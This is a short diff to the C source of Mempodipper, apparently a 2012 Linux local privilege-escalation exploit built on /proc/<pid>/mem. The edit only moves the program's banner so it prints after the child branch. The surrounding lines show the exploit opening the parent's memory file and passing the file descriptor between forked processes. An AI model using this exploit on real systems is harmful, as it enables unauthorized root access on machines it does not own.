@@ -115,12 +115,6 @@ int recv_fd()
 
 int main(int argc, char **argv)
 {
-	printf("===============================\n");
-	printf("=          Mempodipper        =\n");
-	printf("=           by zx2c4          =\n");
-	printf("=         Jan 21, 2012         =\n");
-	printf("===============================\n\n");
-	
 	if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'c') {
 		char parent_mem[256];
 		sprintf(parent_mem, "/proc/%s/mem", argv[2]);
@@ -134,6 +128,13 @@ int main(int argc, char **argv)
 		send_fd(fd);
 		return 0;
 	}
+	
+	printf("===============================\n");
+	printf("=          Mempodipper        =\n");
+	printf("=           by zx2c4          =\n");
+	printf("=         Jan 21, 2012         =\n");
+	printf("===============================\n\n");
+	
 	int parent_pid = getpid();
 	if (fork()) {
 		printf("[+] Waiting for transferred fd in parent.\n");
